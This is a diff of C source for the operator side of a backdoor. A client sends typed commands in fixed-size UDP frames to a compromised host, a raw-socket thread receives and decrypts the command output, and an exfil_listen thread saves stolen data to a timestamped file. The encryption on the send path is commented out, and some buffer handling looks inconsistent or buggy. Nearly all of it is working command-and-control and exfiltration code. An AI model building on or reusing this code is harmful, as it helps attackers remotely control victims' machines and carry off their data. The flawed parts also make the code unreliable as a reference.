@@ -48,14 +48,35 @@ void backdoor_client(uint32 ipaddr, int dport, int duplex)
 	printf("Ready, awaiting your command...\n");
 	while(fgets(command, MAX_LEN, stdin) != NULL)
 	{
-		char *frame;
-		int length;
+		char *trans;
+		int tot_len;
 
-		length = strlen(command) + 1;
+		tot_len = strlen(command) + 1;
 
-		frame = buildTransmission(command, &length, CMD_TYP);
-		sendto(sock, frame, length, 0, (struct sockaddr *)&saddr, sizeof(saddr));
-		free(frame);
+		trans = buildTransmission(command, &tot_len, CMD_TYP);
+
+		for (int i = 0; i < tot_len; i += 8)
+		{
+			char frame[FRAM_SZ];
+			char *enc;
+			char *ptr;
+			int fram_len;
+
+			ptr = trans + i;
+
+			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;
+
+			memcpy(frame, ptr, fram_len);
+
+//			enc = encrypt(SEKRET, frame, FRAM_SZ);
+
+//			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+
+//			free(enc);
+			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+		}
+
+		free(trans);
 	}	
 
 	// Listen thread cleanup
@@ -72,36 +93,55 @@ void *listen_thread(void *arg)
 {
 	struct sockaddr_in saddr = *(struct sockaddr_in*)arg;
 	int sock;
-	char buff[MAX_LEN];
+	char buf[MAX_LEN];
+	int buf_len = 0;
 
-	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	printf("Listen thread active.\n");
+	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+	if(sock < 0)
+		error("unable to open listening raw socket");
 	
 	saddr.sin_addr.s_addr = htonl(INADDR_ANY);
-
 	if (bind(sock, (struct sockaddr*)&saddr, sizeof(saddr)) < 0)
 		error("Unable to bind result port.\n");
 
 	while(!closing)
 	{
+		char packet[MAX_LEN];
+		char *ptr;
+		char *data;
 		char *dec;
-		int len;
 		char type;
+		int  pack_len;
 
-		socklen_t size = sizeof(saddr);
-		len = recvfrom(sock, buff, MAX_LEN, 0, (struct sockaddr*)&saddr, &size);
+		pack_len = read(sock, &packet, MAX_LEN);
 
-		dec = getTransmission(buff, &len, &type);
+		// Step 1: locate the payload portion of the packet
+		if (pack_len - ETHER_IP_UDP_LEN <= 0)
+			continue;
+		ptr = (char *)(packet + ETHER_IP_UDP_LEN);
 
+		// Step 2: check for signature
+
+		// Step 3: dump data into buffer
+		dec = decrypt(SEKRET, ptr, FRAM_SZ);
+		data = buf + buf_len;
+		memcpy(data, dec, FRAM_SZ);
+		free(dec);
+
+		buf_len += pack_len - ETHER_IP_UDP_LEN;
+
+		// Step 4: see if we have a full transmission
+		data = getTransmission(ptr, &buf_len, &type);
+		if (data == NULL)
+			continue;
+
+		// Step 5: show the results
 		if (type == RSP_TYP)
-		{
-			dec = decrypt(PASSKEY, dec, len);
-			memcpy(buff, dec, len);
-			free(dec);
+			printf("%s", data);
 
-			buff[len] = 0x0;
-			printf("%s", buff);
-		}
+		// Step 6: reset buffer
+		memset(buf, 0, MAX_LEN);
+		buf_len = 0;
 	}
 
 	return NULL;
@@ -119,18 +159,14 @@ void* exfil_listen(void *arg)
 {
 	int sock;
 	char buf[MAX_LEN];
-	int ret;
 	uint64 timestamp;
 	char fname[MAX_LEN];
 	FILE* file;
-	uint32 src_addr = *(uint32*)arg;
+//	uint32 src_addr = *(uint32*)arg;
 
 	sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
 	if(sock < 0)
-	{
-		perror("receive socket cannot be open. Are you root?");
-		exit(1);
-	}
+		error("unable to open exfil raw socket");
 
 	timestamp = get_sec();
 	sprintf(fname, "%llX", timestamp);
@@ -142,22 +178,17 @@ void* exfil_listen(void *arg)
 		char type;
 		int len;
 
-		ret = read(sock, &buf, MAX_LEN);
+		len = read(sock, &buf, MAX_LEN);
 
 		data = getTransmission(buf, &len, &type);
 
 		if (type == XFL_TYP)
 		{
-			data = decrypt(SEKRET, data, len);
-
-			data = extract_udp(src_addr, buf, ret);
-
 			printf("%s", data);
-
 			fwrite(data, 2, 1, file);
-
-			free(data);
 		}
+
+		free(data);
 	}
 
 	fclose(file);
